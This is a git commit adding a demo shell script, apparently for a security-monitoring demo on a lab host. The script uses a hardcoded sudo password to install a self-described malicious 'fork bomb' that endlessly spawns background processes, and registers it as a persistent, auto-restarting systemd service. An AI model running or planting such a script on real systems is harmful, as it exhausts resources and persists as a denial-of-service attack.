3dd56c0be5d82a7371530416cf87df56cbb63d75
Nizan Shookroun <60652696+nizansho@users.noreply.github.com>
2024-08-14 21:09:09 +0300

    create attack script to run from inside demo
    this script is executed through the demo script, does not need to run it on your own :)
    
    can be run manually if we do a live session demo by entering as the demo user to 10.10.248.158 host and running the same script it runs in demo.sh

---
+++ demo/attack.sh
@@ -0,0 +1,59 @@
+echo "Creating a malicious script of fork bomb"
+echo 1 | sudo -S touch /usr/local/bin/fork_bomb.sh
+
+echo 1 | sudo -S tee /usr/local/bin/fork_bomb.sh > /dev/null << EOF
+#!/bin/bash
+
+create_child_process() {
+    sleep 9999 &
+    child_pid=\$!
+    echo "Created child process with PID: \$child_pid"
+}
+
+trap 'kill \$(jobs -p); exit' SIGINT SIGTERM
+
+while true
+do
+    for i in \$(seq 1 60);
+    do
+        create_child_process
+    done
+    sleep 30
+done
+EOF
+
+sleep 2
+
+echo "Making demo as owner of the malicious script and making script executable"
+echo '1' | sudo -S chmod +x /usr/local/bin/fork_bomb.sh
+echo 1 | sudo -S chown demo: /usr/local/bin/fork_bomb.sh
+
+sleep 2 
+
+echo "Creating a service for the malicious fork bomb script"
+echo 1 | sudo -S touch /etc/systemd/system/fork.service
+
+echo 1 | sudo -S tee /etc/systemd/system/fork.service > /dev/null << EOF
+[Unit]
+Description=Malicious Fork Bomb Service
+After=network.target
+
+[Service]
+ExecStart=/usr/local/bin/fork_bomb.sh
+ExecStop=/bin/kill -s SIGTERM \$MAINPID
+Restart=always
+User=demo
+KillMode=process
+Type=simple
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+sleep 2
+
+echo "Reloading systemd and starting the malicious fork bomb script"
+echo 1 | sudo -S systemctl daemon-reload
+echo 1 | sudo -S systemctl start fork.service
+
+echo "Fork Bomb attack has begun !!!"
